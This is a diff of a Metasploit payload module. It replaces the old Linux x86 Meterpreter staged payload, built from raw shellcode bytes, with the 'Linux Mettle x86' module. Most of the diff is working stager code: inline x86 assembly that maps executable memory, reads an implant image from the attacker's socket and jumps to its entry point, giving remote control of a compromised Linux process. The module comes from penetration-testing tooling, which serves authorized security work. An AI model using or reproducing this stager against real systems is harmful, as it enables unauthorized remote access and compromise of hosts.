@@ -1,127 +1,101 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/base/sessions/meterpreter_x86_linux'
-require 'msf/base/sessions/meterpreter_options'
 require 'rex/elfparsey'
 
-module Metasploit3
-	include Msf::Sessions::MeterpreterOptions
+module MetasploitModule
+  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::MettleConfig
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'          => 'Linux Meterpreter',
-			'Description'   => 'Staged meterpreter server',
-			'Author'        => ['PKS', 'egypt'],
-			'Platform'      => 'linux',
-			'Arch'          => ARCH_X86,
-			'License'       => MSF_LICENSE,
-			'Session'       => Msf::Sessions::Meterpreter_x86_Linux))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'        => 'Linux Mettle x86',
+        'Description' => 'Inject the mettle server payload (staged)',
+        'Author'      => [
+          'William Webb <william_webb[at]rapid7.com>'
+        ],
+        'Platform'    => 'Linux',
+        'Arch'        => ARCH_X86,
+        'License'     => MSF_LICENSE,
+        'Session'     => Msf::Sessions::Meterpreter_x86_Linux
+      )
+    )
+  end
 
-		register_options([
-			OptBool.new('PrependFork', [ false, "Add a fork() / exit_group() (for parent) code" ]),
-			OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
-		], self.class)
-	end
+  def elf_ep(payload)
+    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
+    elf.elf_header.e_entry
+  end
 
-	def elf_ep(payload)
-		elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
-		ep = elf.elf_header.e_entry
-		return ep
-	end
+  def asm_intermediate_stage(payload)
+    entry_offset = elf_ep(payload)
 
-	def elf2bin(payload)
-		# XXX, not working. Use .c version
+    %(
+      push edi                    ; save sockfd
+      xor ebx, ebx                ; address
+      mov ecx, #{payload.length}  ; length
+      mov edx, 7                  ; PROT_READ | PROT_WRITE | PROT_EXECUTE
+      mov esi, 34                 ; MAP_PRIVATE | MAP_ANONYMOUS
+      xor edi, edi                ; fd
+      xor ebp, ebp                ; pgoffset
+      mov eax, 192                ; mmap2
+      int 0x80                    ; syscall
 
-		# This code acts as a mini elf parser / memory layout linker.
-		# It will return what a elf file looks like once loaded in memory
+      ; receive mettle process image
+      mov edx, eax                ; save buf addr for next code block
+      pop ebx                     ; sockfd
+      push 0x00000100             ; MSG_WAITALL
+      push #{payload.length}      ; size
+      push eax                    ; buf
+      push ebx                    ; sockfd
+      mov ecx, esp                ; arg array
+      mov ebx, 10                 ; SYS_READ
+      mov eax, 102                ; sys_socketcall
+      int 0x80                    ; syscall
 
-		mem = "\x00" * (4 * 1024 * 1024)
-		used = 0
+      ; setup stack
+      pop edi
+      xor ebx, ebx
+      and esp, 0xfffffff0         ; align esp
+      add esp, 40
+      mov eax, 109
+      push eax
+      mov esi, esp
+      push ebx                    ; NULL
+      push ebx                    ; AT_NULL
+      push edx                    ; mmap buffer
+      mov eax, 7
+      push eax                    ; AT_BASE
+      push ebx                    ; end of ENV
+      push ebx                    ; NULL
+      push edi                    ; sockfd
+      push esi                    ; m
+      mov eax, 2
+      push eax                    ; argc
 
-		elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
+      ; down the rabbit hole
+      mov eax, #{entry_offset}
+      add edx, eax
+      jmp edx
+    )
+  end
 
-		elf.program_header.each { |hdr|
-			if(hdr.p_type == Rex::ElfParsey::ElfBase::PT_LOAD)
-				print_status("Found PT_LOAD")
-				fileidx = hdr.p_offset & (~4095)
-				memidx = (hdr.p_vaddr & (~4095)) - elf.base_addr
-				len = hdr.p_filesz + (hdr.p_vaddr & 4095)
+  def generate_intermediate_stage(payload)
+    Metasm::Shellcode.assemble(Metasm::X86.new, asm_intermediate_stage(payload)).encode_string
+  end
 
-				mem[memidx,memidx+len] = payload[fileidx,fileidx+len] # should result in a single memcpy call :D
-				used += (hdr.p_memsz + (hdr.p_vaddr & 4095) + 4095) & ~4095
-			end
-		}
+  def handle_intermediate_stage(conn, payload)
+    midstager = generate_intermediate_stage(payload)
+    vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
+    conn.put(midstager) == midstager.length
+  end
 
-		# Maybe at some stage zero out elf header / program headers in case tools
-		# try to look for them
-
-		print_status("Converted ELF file to memory layout, #{payload.length} to #{used} bytes")
-		return mem[0, used]
-	end
-
-	def handle_intermediate_stage(conn, payload)
-		# Does a mmap() / read() loop of a user specified length, then
-		# jumps to the entry point (the \x5a's)
-
-		midstager = "\x81\xc4\x54\xf2\xff\xff" # fix up esp
-
-		if(datastore['PrependFork'])
-			# fork() / parent does exit()
-
-			# If the target process is threaded, this means the thread
-			# will exit. exit_group() will try to close the process down
-			# completely.. and if we do that, it may not be reaped
-			# correctly.
-			#
-			# Plus, depending on the vuln, we might get multiple shots at
-			# owning a finite amount of threads.
-
-			midstager <<
-			"\x6a\x02\x58\xcd\x80\x85\xc0\x74\x06\x31\xc0\xb0\x01\xcd\x80"
-		end
-
-		midstager <<
-			"\x6a\x04\x5a\x89\xe1\x89\xfb\x6a\x03\x58" +
-			"\xcd\x80\x57\xb8\xc0\x00\x00\x00\xbb\x00\x00\x04\x20\x8b\x4c\x24" +
-			"\x04\x6a\x07\x5a\x6a\x32\x5e\x31\xff\x89\xfd\x4f\xcd\x80\x3d\x7f" +
-			"\xff\xff\xff\x72\x05\x31\xc0\x40\xcd\x80\x87\xd1\x87\xd9\x5b\x6a" +
-			"\x03\x58\xcd\x80\x3d\x7f\xff\xff\xff\x77\xea\x85\xc0\x74\xe6\x01" +
-			"\xc1\x29\xc2\x75\xea\x6a\x59\x53\xb8\x5a\x5a\x5a\x5a\xff\xd0\xe9" +
-			"\xd1\xff\xff\xff"
-
-
-		# Patch in debug options
-		midstager = midstager.sub("Y", [ datastore['DebugOptions'] ].pack('C'))
-
-		# Patch entry point
-		midstager = midstager.sub("ZZZZ", [ elf_ep(payload) ].pack('V'))
-
-		# Maybe in the future patch in base.
-
-		print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
-		conn.put(midstager)
-		Rex::ThreadSafe.sleep(1.5)
-
-		# Send length of payload
-		conn.put([ payload.length ].pack('V'))
-		return true
-
-	end
-
-	def generate_stage
-		#file = File.join(Msf::Config.data_directory, "msflinker_linux_x86.elf")
-		file = File.join(Msf::Config.install_root, "data", "meterpreter", "msflinker_linux_x86.bin")
-
-		met = File.open(file, "rb") {|f|
-			f.read(f.stat.size)
-		}
-
-		return met
-	end
+  def generate_stage(opts = {})
+    MetasploitPayloads::Mettle.new('i486-linux-musl',
+      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :process_image
+  end
 end
